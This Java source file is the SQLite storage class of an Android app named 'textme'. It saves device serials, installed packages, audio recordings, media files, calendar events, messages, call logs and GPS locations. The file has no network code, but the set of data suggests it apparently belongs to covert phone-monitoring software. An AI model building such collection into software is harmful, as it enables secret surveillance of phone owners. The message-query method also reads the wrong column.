package com.candroid.textme;

import android.content.ContentValues;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

import java.io.File;
import java.util.List;

public class Database {

    protected static final String COLUMN_MANUFACTURER = "manufacturer";
    protected static final String COLUMN_PRODUCT = "product";
    protected static final String COLUMN_VERSION = "version";
    protected static final String COLUMN_FLAVOR = "flavor";
    protected static final String COLUMN_SERIAL = "serial";
    protected static final String COLUMN_RADIO = "radio";

    protected static void insertDevice(DatabaseHelper database, String address, String manufacturer, String product, String version, String flavor, String serial, String radio){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            ContentValues values = new ContentValues();
            values.put(DataContract.DeviceContract.COLUMN_ADDRESS, address);
            values.put(DataContract.DeviceContract.COLUMN_MANUFACTURER, manufacturer);
            values.put(DataContract.DeviceContract.COLUMN_PRODUCT, product);
            values.put(DataContract.DeviceContract.COLUMN_VERSION, version);
            values.put(DataContract.DeviceContract.COLUMN_FLAVOR, flavor);
            values.put(DataContract.DeviceContract.COLUMN_SERIAL, serial);
            values.put(DataContract.DeviceContract.COLUMN_RADIO, radio);
            newRowId = db.insert(DataContract.DeviceContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        if(newRowId > -1){
            Log.d("DATABASE", "We inserted a new device into our device database table");
        }
        db.close();
    }

    protected static void insertPackages(DatabaseHelper database, List<ApplicationInfo> apps){
        SQLiteDatabase db = database.getWritableDatabase();
        for(ApplicationInfo app : apps){
            try{
                ContentValues values = new ContentValues();
                values.put(DataContract.PackagesContract.COLUMN_PACKAGE_NAME, app.packageName);
                long newRowId = db.insert(DataContract.PackagesContract.TABLE_NAME, null, values);
                Log.d("Database", "inserted new package name into row id = " + newRowId);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        db.close();
    }

    protected static long insertAudioFile(Context context, DatabaseHelper database, long time, File audioFile){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            byte[] file = Helpers.fileToBytes(audioFile);
            ContentValues values = new ContentValues();
            values.put(DataContract.AudioRecordingsContract.COLUMN_TIME, time);
            values.put(DataContract.AudioRecordingsContract.COLUMN_AUDIO_FILES, file);
            newRowId = db.insert(DataContract.AudioRecordingsContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        db.close();
        return newRowId;
    }

    protected static long insertMedia(DatabaseHelper database, String name, File mediaFile){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        int type = -1;
        boolean isImage = Helpers.isImage(mediaFile);
        boolean isVideo = Helpers.isVideo(mediaFile);
        boolean isText = Helpers.isText(mediaFile);
        boolean isExcel = Helpers.isSpreadsheet(mediaFile);
        if(isImage){
            type = DataContract.MediaContract.TYPE_IMAGE;
        }else if(isVideo){
            type = DataContract.MediaContract.TYPE_VIDEO;
        }else if(isText){
            type = DataContract.MediaContract.TYPE_TEXT;
        }else if(isExcel){
            type = DataContract.MediaContract.TYPE_SPREADSHEET;
        } else{
            type = 0;
        }
        try{
            byte[] file = Helpers.fileToBytes(mediaFile);
            ContentValues values = new ContentValues();
            values.put(DataContract.MediaContract.COLUMN_TITLE, name);
            values.put(DataContract.MediaContract.COLUMN_FILE, file);
            values.put(DataContract.MediaContract.COLUMN_TYPE, type);
            newRowId = db.insert(DataContract.MediaContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        db.close();
        return newRowId;
    }

    protected static long insertCalendarEvent(Context context, DatabaseHelper database, String email, String title, String description, long startTime, long endTime, int isAllDay, String duration, String timeZone, String location, String organizer){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            ContentValues values = new ContentValues();
            values.put(DataContract.CalendarEventContract.COLUMN_EMAIL_ACCOUNT, email);
            values.put(DataContract.CalendarEventContract.COLUMN_TITLE, title);
            values.put(DataContract.CalendarEventContract.COLUMN_DESCRIPTION, description);
            values.put(DataContract.CalendarEventContract.COLUMN_START_TIME, startTime);
            values.put(DataContract.CalendarEventContract.COLUMN_END_TIME, endTime);
            values.put(DataContract.CalendarEventContract.COLUMN_IS_ALL_DAY, isAllDay);
            values.put(DataContract.CalendarEventContract.COLUMN_DURATION, duration);
            values.put(DataContract.CalendarEventContract.COLUMN_TIMEZONE, timeZone);
            values.put(DataContract.CalendarEventContract.COLUMN_LOCATION, location);
            values.put(DataContract.CalendarEventContract.COLUMN_ORGANIZER, organizer);
            newRowId = db.insert(DataContract.CalendarEventContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        db.close();
        return newRowId;
    }

    protected static long insertMessage(Context context, DatabaseHelper database, String columnOne, String columnTwo, String columnThree, long time){
        SQLiteDatabase db = database.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(DataContract.COLUMN_DESTINATION_ADDRESS, columnOne);
        values.put(DataContract.COLUMN_ORIGIN_ADDRESS, columnTwo);
        values.put(DataContract.COLUMN_BODY, columnThree);
        values.put(DataContract.COLUMN_TIME, time);
        long newRowId = db.insert(DataContract.TABLE_NAME, null, values);
        db.close();
        return newRowId;
    }

    protected static long insertCallLogEntry(Context context, DatabaseHelper database, String type, String address, String duration, String time){
        SQLiteDatabase db = database.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(DataContract.CallLogContract.COLUMN_TYPE, type);
        values.put(DataContract.CallLogContract.COLUMN_ADDRESS, address);
        values.put(DataContract.CallLogContract.COLUMN_DURATION, duration);
        values.put(DataContract.CallLogContract.COLUMN_TIME, time);
        long newRowId = db.insert(DataContract.CallLogContract.TABLE_NAME, null, values);
        db.close();
        return newRowId;
    }

    protected static long insertLocation(Context context, DatabaseHelper database, double latitude, double longitude){
        SQLiteDatabase db = database.getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(DataContract.LocationData.COLUMN_LATITUDE, latitude);
        values.put(DataContract.LocationData.COLUMN_LONGITUDE, longitude);
        long newRowId = db.insert(DataContract.LocationData.TABLE_NAME, null, values);
        db.close();
        return newRowId;
    }

    protected static String getMessages(Context context, String phraseToLookFor, DatabaseHelper database){
        StringBuilder messages = new StringBuilder();
        SQLiteDatabase db = database.getReadableDatabase();
        String[] projection = new String[]{DataContract._ID, DataContract.COLUMN_DESTINATION_ADDRESS, DataContract.COLUMN_ORIGIN_ADDRESS};
        String selection = DataContract.COLUMN_DESTINATION_ADDRESS + " = ?";
        String[] selectionArgs = new String[]{phraseToLookFor};
        String sortOrder = DataContract.COLUMN_DESTINATION_ADDRESS + " DESC";
        Cursor cursor = db.query(DataContract.TABLE_NAME, projection, selection, selectionArgs, null, null, sortOrder);
        int addressColumn = cursor.getColumnIndexOrThrow(DataContract.COLUMN_DESTINATION_ADDRESS);
        int bodyColumn = cursor.getColumnIndexOrThrow(DataContract.COLUMN_ORIGIN_ADDRESS);
        while(cursor.moveToNext()){
            messages.append(cursor.getString(addressColumn));
            messages.append(" - ");
            messages.append(cursor.getString(bodyColumn));
            messages.append(Constants.NEW_LINE);
        }
        cursor.close();
        db.close();
        return messages.toString();
    }

    protected static int deleteMessages(Context context, DatabaseHelper database, String phraseToLookFor){
        SQLiteDatabase db = database.getWritableDatabase();
        String selection = DataContract.COLUMN_DESTINATION_ADDRESS + " LIKE ?";
        String[] selectionArgs = new String[]{phraseToLookFor};
        int numberOfRowsDeleted = db.delete(DataContract.TABLE_NAME, selection, selectionArgs);
        db.close();
        return numberOfRowsDeleted;
    }

}